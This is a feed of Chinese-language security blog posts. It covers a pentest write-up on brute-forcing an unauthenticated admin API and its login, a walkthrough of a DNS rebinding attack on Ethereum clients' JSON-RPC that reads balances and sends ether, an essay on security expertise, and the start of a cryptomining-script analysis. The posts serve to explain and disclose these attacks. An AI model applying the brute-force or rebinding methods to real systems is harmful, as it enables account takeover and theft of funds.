這意味著這伺服器沒有任何授權管理。基本上，我們可以向包括&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;/chatbot&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;/moderate&lt;/code&gt;的任何 API 端口發出任何請求，因為我們知道請求主體(Request body) 的結構和相關的標頭(Header)。現在讓我們嘗試使用 Swagger UI 的端口進行更多暴力窮舉並擴大這個漏洞利用。&lt;/p&gt;

&lt;p&gt;從 Swagger UI 附件中，我們可以看到有另一個端口藉由向&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/users/{id}&lt;/code&gt;發送請求來查找有關管理員帳戶的訊息。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /xyz/api/admin/users/1 HTTP/1.1
Host: https://admin.company.com
User Agent: MS-RELEASE/1.0.32 (iPhone; iOS 10.1.1; Scale/2.00)
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkdldCB5b3VyIG93biB0b2tlbiEiLCJpYXQiOjE1MTYyMzkwMjJ9.12neWKBPl2q0alhnEiJ_g018_0YHtZMaFzCjsWs0VE

{
  &quot;ID&quot;: 1,
  &quot;Name&quot;: &quot;Admin User&quot;,
  &quot;Username&quot;: &quot;XYZ&quot;,
  &quot;EMail&quot;: &quot;dev@nonexistingdomain.com&quot;,
  &quot;Roles&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;Name&quot;: &quot;Admin&quot;,
      &quot;Menu&quot;:[
        {
          &quot;Path&quot;: &quot;#/admin&quot;,
          &quot;Icon&quot;: &quot;fa-user&quot;,
          &quot;Order&quot;: &quot;1&quot;,
          &quot;Roles&quot;: &quot;READ,WRITE&quot;,
        }
      ]
    }  
}     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;真的很棒！使用 Burp 的 Intruder 功能，我們可以通過暴力窮舉&lt;code class=&quot;highlighter-rouge&quot;&gt;{id}&lt;/code&gt;參數來取得所有(共8位)管理員的用戶名與電子郵件。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/iluoWSf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;現在我們已取得管理員帳戶名可以嘗試登入。讓我們使用從&lt;a href=&quot;https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials&quot;&gt;Seclists&lt;/a&gt;中獲取通用密碼列表在觸動警報之前運行一個快速暴力破解程式。&lt;/p&gt;

&lt;p&gt;幸運的是，其中一位管理員帳戶的密碼強度較弱，並且該應用程式在登入頁面中沒有任何速率限制。通過取得的管理員權限，我們可以做任何事情，從添加或刪除用戶，修改移動應用程序中顯示的內容，向終端用戶發送通知以及做許多更多很多有趣的事情。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jZQDhGv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;將各個思路組合在一起，以便在 Web應用程式上取得管理員權限實在十分有趣。我還在&lt;a href=&quot;https://secdevops.ai/ios-static-analysis-and-recon-c611eaa6d108&quot;&gt;SecDevOps&lt;/a&gt;上撰寫了關於iOS應用程式靜態分析的&lt;a href=&quot;https://secdevops.ai/ios-static-analysis-and-recon-c611eaa6d108&quot;&gt;入門&lt;/a&gt;。懇請撥冗參閱 ;）&lt;/p&gt;

&lt;p&gt;不要猶豫，歡迎發表並回饋些意見或評論。如果願意的話，你也可以在&lt;a href=&quot;https://twitter.com/67616d654661636&quot;&gt;Twitter&lt;/a&gt;上直接私訊我。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="API" /><category term="Mobile APP" /><summary type="html">偵察是滲透測試中有趣且最重要的部分。良好的使用偵察，可以有效的查找到 API 端口、相關敏感文件或文件夾、鮮嫩多汁的子網域 (編註:原文如此) 等等。在我最近一次的研究中發現了一個由於缺少授權管理甚至敏感文件還設為公開的目標，這使我能夠輕易進入其管理控制台。</summary></entry><entry><title type="html">DNS重綁 偷你以太幣</title><link href="https://security-onigiri.github.io//2018/05/13/dns.html" rel="alternate" type="text/html" title="DNS重綁 偷你以太幣" /><published>2018-05-13T00:00:00+08:00</published><updated>2018-05-13T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/13/dns</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/13/dns.html">&lt;p&gt;●&lt;a href=&quot;https://ret2got.wordpress.com/author/ret2got/&quot;&gt;ret2got&lt;/a&gt; ●未分類 ●2018年1月19日 ●約4分鐘可讀完&lt;/p&gt;

&lt;p&gt;當我們針對如何利用&lt;a href=&quot;https://twitter.com/taviso/&quot;&gt;Tavis Ormandy&lt;/a&gt;發掘的&lt;strong&gt;在本地主機上的未驗證&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務&lt;/strong&gt;開展討論時，我所想到的第一件事就是把這手法套在以太坊的客戶端（Geth，Mist與Parity）。&lt;/p&gt;

&lt;p&gt;大多數以太坊客戶端都在本機上的8545埠上運行&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務，但由於它位於本機上，所以基於&lt;a href=&quot;https://en.wikipedia.org/wiki/Same-origin_policy&quot;&gt;SOP&lt;/a&gt;的緣故，我們無法直接從用戶的瀏覽器訪問它。在電子錢包中的
&lt;a href=&quot;https://github.com/spesmilo/electrum/issues/3374&quot;&gt;這個文章&lt;/a&gt;利用了&lt;a href=&quot;https://en.wikipedia.org/wiki/Cross-origin_resource_sharing&quot;&gt;CORS&lt;/a&gt;標頭來通過本地主機上的JSON-RPC破解並控制用戶的電子錢包。&lt;/p&gt;

&lt;p&gt;這讓Geth的JSON-RPC看起來非常安全，因為它沒有返還任何的&lt;code class=&quot;highlighter-rouge&quot;&gt;CORS&lt;/code&gt;標頭，但是後來&lt;a href=&quot;https://github.com/cpacia&quot;&gt;cpacia&lt;/a&gt;則在&lt;a href=&quot;https://github.com/spesmilo/electrum/issues/3374&quot;&gt;回文&lt;/a&gt;中下了個有關這個以太坊電子錢包的評論，而這正引發了我的新想法。以下是他當時的回文&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;只是禁用&lt;code class=&quot;highlighter-rouge&quot;&gt;CORS&lt;/code&gt;仍然容易受到DNS重新綁定的攻擊。它應該需要被驗證。       〜cpacia&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;我曾聽說過DNS重新綁定，但從來沒有試圖深入研究它。由於Geth的JSON-RPC也未經過身份驗證，它也很可能容易受到DNS重新綁定攻擊是嗎？&lt;/p&gt;

&lt;p&gt;還著實作的想法，我後來在&lt;a href=&quot;https://searchsecurity.techtarget.com/definition/DNS-rebinding-attack&quot;&gt;這裡&lt;/a&gt;找到了些&lt;a href=&quot;https://en.wikipedia.org/wiki/DNS_rebinding&quot;&gt;DNS重新綁定&lt;/a&gt;的基本定義。&lt;/p&gt;

&lt;p&gt;我嘗試開始研究DNS的重新綁定，但遇到個主要問題是所有的文章都是上古世紀的遺物。所以我在Bug Bounty的論壇上詢問了這個問題，幸運的，&lt;a href=&quot;https://twitter.com/TheBoredEng&quot;&gt;Luke Young&lt;/a&gt;就將他2017年關於現今可行的DNS重新開發利用之&lt;a href=&quot;https://www.youtube.com/watch?v=Q0JG_eKLcws&quot;&gt;DEFCON神級演講&lt;/a&gt;的連結發來給我。它還包括了一個&lt;a href=&quot;https://github.com/linkedin/jaqen&quot;&gt;自動化工具&lt;/a&gt;，可以在大多數現存瀏覽器上實現DNS重新綁定。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TJQyWCe.png&quot; alt=&quot;&quot; /&gt;
(嘿，起司，我知道你可以，但針對”現存”，請你躺回去。)&lt;/p&gt;

&lt;p&gt;了解愈多讓我愈好奇，但我並不想使用任何預製工具。所以我開始編寫我自己的DNS伺服器。Python有一個非常好的函式庫──&lt;code class=&quot;highlighter-rouge&quot;&gt;dnslib&lt;/code&gt;。它可以為我處理大部分的東西。我還註冊了一個網域，並設置了一些&lt;code class=&quot;highlighter-rouge&quot;&gt;glue records&lt;/code&gt;指向我的伺服器，並將它們用作&lt;code class=&quot;highlighter-rouge&quot;&gt;nameservers&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;因為我想看看不同瀏覽器在遇到極低的TTL中的行為表現，所以我讓我的DNS服務器返還&lt;code class=&quot;highlighter-rouge&quot;&gt;TTLs &amp;lt; 5&lt;/code&gt;。而有趣的是，Chrome、Firefox和Safari都接受了這個等待60秒的DNS回應，儘管他標明TTL小於5。&lt;/p&gt;

&lt;p&gt;60秒並不是很長時間，應該還算在可接受範圍，而我想我可以讓用戶留在我的網頁上至少60秒。現在唯一剩下的就是實際嘗試。&lt;/p&gt;

&lt;p&gt;我用&lt;code class=&quot;highlighter-rouge&quot;&gt;--rpc&lt;/code&gt;旗幟（當然是在testnet上）&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;geth -rpc -testnet&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;現在是時候加點Javascript的料了，而這正是最難的部分。因為我不是一個好的web開發人員，每次使用JavaScript的處理某些行為時，我都很難將自己的思緒兜起來以JS實現。所以我跌跌撞撞的在3個小時內寫出了一個非常糟糕但有效果的JavaScript。而最初的結果是成功的。&lt;/p&gt;

&lt;p&gt;現在為了使它與geth一起成功運行，因為&lt;code class=&quot;highlighter-rouge&quot;&gt;SOP&lt;/code&gt;，我必須在8545埠上運行我的web伺服器和網域。但是，如果我到時要受害者自主將Web連結封包發送給任何埠號為8545的人，但這方法感覺起來實在有點草率且不精緻。&lt;/p&gt;

&lt;p&gt;所以我想到的解決方案是使用&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;。我讓&lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;監聽8545和80，並為這兩個埠各設置一個虛擬主機。現在我可以建立&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;將對80的請求轉到8545埠並在其中隱藏的&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;運行所有的JavaScript。&lt;/p&gt;

&lt;p&gt;另一個問題是關於多個用戶，如果多個用戶同時訪問我的網域會怎麼樣？DNS伺服器肯定會因為我這種使用基於計數器的系統而感到困惑，並且因此無法區分各個用戶的請求。這問題讓我整個計畫撞牆了一段時間，直到我記起有&lt;code class=&quot;highlighter-rouge&quot;&gt;subdomains&lt;/code&gt;這個東西。&lt;/p&gt;

&lt;p&gt;每當用戶訪問主域名時，我都可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;為其添加一個隨機子域名用作標識。我知道我可能沒法很好地解釋它，但接下來我舉個例子好了。&lt;/p&gt;

&lt;p&gt;讓我們假設我的網域名稱為&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;而我的伺服器的IP是&lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;這樣，那麼流程是：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;受害者在瀏覽器中打開&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;首先，DNS請求attacker.com被發送到我的伺服器，並回應以真實IP &lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;接下來，&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;加載到用戶的瀏覽器，然後創建一個隱藏的&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;與一個隨機子域&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com:8545&lt;/code&gt;，並將其附加到&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;body&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;現在，DNS請求被發送到我的伺服器的子網域&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com&lt;/code&gt;，並且DNS伺服器再次回應真實IP &lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;。但是這一次，由於目的位於8545埠上，所以&lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;會使用不同的虛擬主機進行回應，進而開始DNS重新綁定攻擊。&lt;/li&gt;
  &lt;li&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com:8545&lt;/code&gt;中的&lt;code class=&quot;highlighter-rouge&quot;&gt;Javascript&lt;/code&gt;會等待60秒，然後發送一個&lt;code class=&quot;highlighter-rouge&quot;&gt;XmlHttpRequest&lt;/code&gt;給&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrr.attacker.com:8545/test&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;由於DNS緩存已過期，瀏覽器會再次解析DNS。這一次，我的伺服器會回應IP &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;現在請求實際上被發送給&lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:8545/test&lt;/code&gt;而不是我的伺服器，並且由於它來源仍被認知為&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrr.attacker.com:8545&lt;/code&gt;，所以我們仍能夠讀取回應。&lt;/li&gt;
  &lt;li&gt;由於我們每次都會生成一個隨機的子網域，因此我們現在甚至可以容納多個用戶，因為子網域可以執行其身份標識。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;為此，我還不得不優化JavaScript，以確保它在95％的時間內運作正常。我在真實的DNS查詢之前添加了一些虛假的DNS查詢，以便它在錯誤的時間不會用錯誤的IP進行響應。&lt;/p&gt;

&lt;p&gt;這基本上也可以用存儲型XSS來破解利用。只需將Script的src指向目標添加&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;TADA&lt;/code&gt;即可！&lt;/p&gt;

&lt;p&gt;所以現在我們可以閱讀&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務的回應，這意味著我們可以讀取他們的以太幣地址，他們的存款數，並且如果他們的賬戶未鎖，他們可能可以竊取他們的以太幣。&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;的API有一個相當不錯的方法──&lt;code class=&quot;highlighter-rouge&quot;&gt;eth_sendTransaction&lt;/code&gt;，它基本上可以用來從用戶帳戶發送&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;我在&lt;a href=&quot;http://rebinddns.ml/&quot;&gt;http://rebinddns.ml&lt;/a&gt; (注意點擊) 上設置了概念驗證。如果你持續超過60秒，並且使用&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;運行Geth（或任何其他&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;客戶端），您將看到一個&lt;code class=&quot;highlighter-rouge&quot;&gt;alert（）&lt;/code&gt;，其中將包含您的&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;地址及其餘額。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jsroMso.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PoC中使用的所有文件都可以在我的&lt;a href=&quot;https://github.com/drigg3r/Ethereum-JSONRPC-DNS-Rebinding&quot;&gt;Github&lt;/a&gt;上找到。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;min.js - 在8545埠上生成子網域及隱藏iframe的Js文件&lt;/li&gt;
  &lt;li&gt;main.js - 執行DNS重新綁定的Js文件&lt;/li&gt;
  &lt;li&gt;server.py - 用python編寫的DNS伺服器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本篇主要概念是以注入的惡意轉址搭配DNS重綁定來攻擊以太坊的未驗證&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務，來取得攻擊成果。&lt;/p&gt;

&lt;p&gt;我已經證實Geth以太幣的C++客戶端和python客戶端都很脆弱。PoC已經在Firefox，Chrome和Safari上進行了測試。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;PS：這已經被報告給了&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;基金會，但他們並不認為它是一個有效的漏洞。&lt;/p&gt;

&lt;p&gt;有任何問題，你都可以到我的twitter&lt;a href=&quot;https://twitter.com/ret2got&quot;&gt;@ret2got&lt;/a&gt;上私訊我。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Blockchain" /><summary type="html">●ret2got ●未分類 ●2018年1月19日 ●約4分鐘可讀完 當我們針對如何利用Tavis Ormandy發掘的在本地主機上的未驗證JSON-RPC服務開展討論時，我所想到的第一件事就是把這手法套在以太坊的客戶端（Geth，Mist與Parity）。</summary></entry><entry><title type="html">你不算個資安專家，如果你只是…</title><link href="https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you.html" rel="alternate" type="text/html" title="你不算個資安專家，如果你只是..." /><published>2018-05-08T00:00:00+08:00</published><updated>2018-05-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you.html">&lt;h1 id=&quot;well-you-are-not-a-security-specialist-if-you-&quot;&gt;Well, you are not a “Security Specialist” if you …&lt;/h1&gt;

&lt;p&gt;Starting this thread is easy …&lt;/p&gt;

&lt;p&gt;I spotted many of people nowadays claimed that they are an “InfoSec Specialist” on their resume, Linkedin profile, etc. This will eventually makes life a bit more difficult for the HR personnel or inexperience hiring managers that are genuinely looking for a real-deal InfoSec Specialist to fill certain specifi job roles.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;用講的很簡單 …&lt;/p&gt;

  &lt;p&gt;我發現現在很多人在他們的履歷、Linkedin 專頁等等，宣稱自己是”資安專家”。這只是在為難想找真正的專家來填補工作空缺的那些 HR 或人事經理人們而已。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So, here are things that separate them from the real specialists and experts out there. See if you may be considered into one of them (inadvertently or deliberately):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以，這裡是一些可以用來區分他們是否為真正的專家，或是熟捻相關事務的從業人員，或許你會想考慮其中一個職業（不小心或蓄意的）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Pentesting/Ethical Hacking Specialist if your day to day job just utilzing some tools to look for vulnerability such as Qualys, Nessus, OpenVAS, Nikto, Acunetix, and alike. We called these tools: Automated Vulnerability Scanners and using one of them does not makes you a Hacker or Pentester Specialist. To makes you a real Pentester, you need to be able to break into the systems manually and be able to gain root/administrator privileges on that system you are breaking (in which pratically allowed you to do anything you wanted with that compromised system). Alternatively you should be able to demonstrate the capability to ex-filtrate any sensitive information out from its protected repositories even if you only given a standard user privilege access to that system.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個專業&lt;strong&gt;滲透測試/道德駭客&lt;/strong&gt;，如果你每天的工作內容都是，使用類似 Qualys、Nessus、OpenVAS、Nikto、Acunetix 之類的工具尋找弱點。我們稱這些工具為：自動化弱點掃描器，使用其中一個工具並不會讓你變成駭客或是滲透測試專家。想當一個真正的滲透測試者，你需要要能手動侵入一個系統並且獲得該系統的管理員權限（表示在那被攻陷的系統上你可以為所欲為）。或是你應該能展示出從一個被保護的存放處洩漏出敏感資訊的能力，甚至你只有被給予一個該系統上一般的使用者權限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Malware Reverse Engineering Specialist if what you are doing simply googling the executable filenames or its MD5 hashes and look it up at VirusTotal or take that executables and run it into the Automated Malware Sandbox Analyzer such as Cuckoo, VT, Malwr, GFI, etc. to be called a real Malware Revese Engineering Specialist, you should be able to perform surgical of the malicious binary files using Hex Editor, Debugger and Disassembler and MOST IMPORTANTLY to be able to decode, de-obfuscate and probaly decrypt the codes and login behind the binary file and locate in which part of the code’s sub-routine that is/are doing evil as to validate if the binary is truly malicious.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個專業&lt;strong&gt;惡意程式逆向工程師&lt;/strong&gt;，如果你只是簡單的 google 執行檔的名稱或是他的 MD5 雜湊並在 VirusTotal 搜尋它，或是丟到 Cuckoo、VT、Malwr、GFI 等等的自動化惡意程式沙盒分析工具。要想成為一個真正的惡意程式逆向工程專家，你應該要能使用&lt;em&gt;十六進位編輯器&lt;/em&gt;、&lt;em&gt;除錯器&lt;/em&gt;、&lt;em&gt;反組譯器&lt;/em&gt;剖析惡意程式二進位檔案，還有&lt;strong&gt;最重要的是&lt;/strong&gt;可以解碼、解混淆並正確的解密程式碼，並且定位到執行惡意行為的程式區段，如果它是真的惡意程式的話。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Cyber Threat Intelligent Specialist if what you do is just to read and forward InfoSec news to your bosses/IT Team without having a proper method on how to dissect, filter and process that information into a valuable intelligence that are useful for your organization in term of how to provide early detection, prevent and deter the cyber attack or casualties from arising or happening to your ogranization.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;網路威脅情資專家&lt;/strong&gt;，如果你只是純粹讀一讀資安新聞，或是轉發資安新聞給你老闆/IT 團隊。在危害發生前，你需要提供一個適切的方法來處理該資訊成為對你的組織有價值的情資，以達到早先偵測、避免與阻斷網路攻擊的目的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Network Attack/DDoS Mitigator Specialist if what you do is merely to have your inbound internet link traffics routed behind a DDoS Scrubbing Provider (like Prolexic/Akamai, Verisign, Incapsula, etc) and you were involved to any DDoS attack events just because you were being called /paged-out by oyur DDoS cloud provider to joined their bridgeline and listening to what they are doing over the phone. To be called a specialist in this field, you need to know how exactly the Network/DDoS attacks coming to your network: the attack vectors, methods, protocols being abused, types of attacks, what is the mitigation control you have in-premise and on-the-cloud, when and what mitigations to activate, etc. You need to be proficient in reading and understand the underlying of packet captures and you also need to know how to build and enhance your defense posture to adapt with the ever increasing attack methods being launch and seen to-date.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;網路攻擊/分散式阻絕緩解專家&lt;/strong&gt;，如果你只是修改路由將網際網路的輸入流量轉接到 DDoS 流量清洗商(例:Prolexic/Akamai, Verisign, Incapsula…)或只從鍵盤參與或是與你的 DDoS 流量清洗商用電話溝通加入他們的實況轉播。
這方面的專業人士必須真正了解網路與 DDoS 攻擊 是如何進入你的網路，例如: 清楚攻擊向量、方式、使用的通訊協定、攻擊類型，地端與雲端可用的緩解方案，緩解方案的啟動時機。
舉例來說，你必須熟悉如何獲取封包並且能夠閱讀內容，同時你必須能夠建立並加強自己的防禦機制去解決與日俱增的攻擊方式和現今正在發生的攻擊。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not Security Event Management Specialist if what you do is just to received event alerts from your IDSes or Log alerting/correclation tools (such as Splunk, ArcSight ESM, etc) and escalate this alerts to your security vendor whom job function is simply doing Level-1 of event forwarding blindly to the proper team. In order to makes you a real Security Event Management Specialist, you need to be able to do some basic analysis of the events and to determine which ones are real events and which ones are false positive. You also needs to have capability to filter out and reduced any false positives by tuning the SIEM system you have access to.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;資安事件管理專家&lt;/strong&gt;，如果你只是從你的入侵偵測系統(IDS)收警告或日誌告警/關聯工具 (諸如：Splunk、ArcSight ESM 等)並將告警呈報給你的資安供應商，這種初級且簡單到可以矇眼轉送的工作。為了成為一個正港的資安事件管理職人，你需要能實作初步的分析判斷哪些是誤報，哪些是真正的告警。你也需要會調校你的 SIEM 系統以達到過濾及減少誤報。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not Security Intrusion Analyst/Specialist if you are simply doing the above job roles of Security Event Management Specialist. To makes you a real deal Seucrity Intrusion Analyst/Specialist, you need to be able to read inside packet capture and tell us on the spot of what is it raelly happening on any particular events. You also will need to be able to perform a holistic analysis even in the case where full packet capture is not available and you need to rely on other means likes system/proxy/firewall/network logs etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不能算是正港的&lt;strong&gt;資安入侵分析師/專家&lt;/strong&gt;，如果你只是做一些上面提到資安事件管理專家做的事情。要想當個真真正正的資安入侵分析師/專家，你需要有透過封包分析並告訴我們目前到底發生了什麼事情。同時也要在封包收錄不足的情況下，佐以系統/代理伺服器/防火牆/網路日誌等等，做到一個完整的解析說明。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Computer Forensic Specialist if what you konw is just to check the system logs from any error message and to run anti-virus software to find out whether or not the system is infected by viruses. To be called a Computer Forensics Specialist, you need to be able to perform proper data acquisition of the evidence from HDD or any other storage, to preserve it well and ensure it is adminssible to the court during trials, to be able to dig deeper down to the file system level of different OSes to find out artifacts of events being investigate, detecting and recovering deleted files from slack spaces and even to recover evidence from volume shadow copies, registry entries, prefetch data, etc. You also need to be proficient with handling volatile memory, know how to acquire them as well as to find malicious code could possibly hiding into other legitimate process(es) via process hollowing, etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不能算是一個&lt;strong&gt;計算機鑑識專家&lt;/strong&gt;，如果你只是看看系統日誌的錯誤訊息，並運行防毒軟體來確認是否有感染跡象。要想當個 real 的計算機鑑識專家，你要會從 HDD 或其他存儲裝置獲取恰當的跡證資料，並將之保存得當並確定這是可以在審訊中做為依據的。要能深入不同作業系統上的檔案系統層級，去找尋正在調查的人為事件、偵測並從殘餘空間復原被刪除的檔案，甚至從 volume shadow 拷貝、註冊表、prefetch file 等等來復原證據，你也需要專業到可以處理揮發性記憶體，知道如何從中取得可能存在合法形成中的惡意程式碼。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hope this article could provide some insight to any HR practitioner specializing in InfoSec recruitment or to any hiring managers that are truly looking for a better (if not one of the best) InfoSec Specilists out there to perform a real challenging jobs that required their true expertise of their respective fields.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;希望這個文章可以讓與資安相關的 HR 從業人員或人事經理多了解一點，在資安相關工作雇用上可以找到好一點的(如果不是要最好的)資安專家，來實踐一些真正需要他們專業及屌炸天的技能來應付的挑戰。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="InfoSec" /><category term="forensics" /><category term="Penetration Test" /><category term="Reversing Engineering" /><summary type="html">Well, you are not a “Security Specialist” if you …</summary></entry><entry><title type="html">挖礦JavaScript代碼的感染趨勢</title><link href="https://security-onigiri.github.io//2018/04/18/javascript.html" rel="alternate" type="text/html" title="挖礦JavaScript代碼的感染趨勢" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/04/18/javascript</id><content type="html" xml:base="https://security-onigiri.github.io//2018/04/18/javascript.html">&lt;p&gt;威脅研究&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;作者 &lt;a href=&quot;https://www.fortinet.com/blog/search.html?author=Eric+Chong&quot;&gt;Eric Chong&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;2018年2月8日&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;1-charcode-javascript&quot;&gt;1. CharCode JavaScript&lt;/h2&gt;
&lt;p&gt;2017年12月6日，FortiGuard實驗室發現了一個被入侵的網站 - acenespargc.com。查看源碼，我們注意到一個可疑的加密腳本，它使用eval（）函數將所有字符轉換為數字。我們使用了一個名為&lt;a href=&quot;http://jdstiles.com/java/cct.html&quot;&gt;CharCode Translator&lt;/a&gt;的工具將這些數字轉換  回程式碼。然後我們就可以反查到將使用者轉址到詐騙網頁或釣魚網站的鏈接。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/p2wS40L.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;第1部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/emTmBaL.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;第2部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;以上只是一個簡單的例子。犯罪者實際上可以根據地理位置自定義釣魚的內容，為了更好地避開檢測機制，它會在檢測到您之前曾訪問過釣魚頁面時消失。&lt;/p&gt;

&lt;p&gt;使用這種技術，犯罪者可以隱藏惡意/網路釣魚/廣告URL，以免被肉眼看到。&lt;/p&gt;

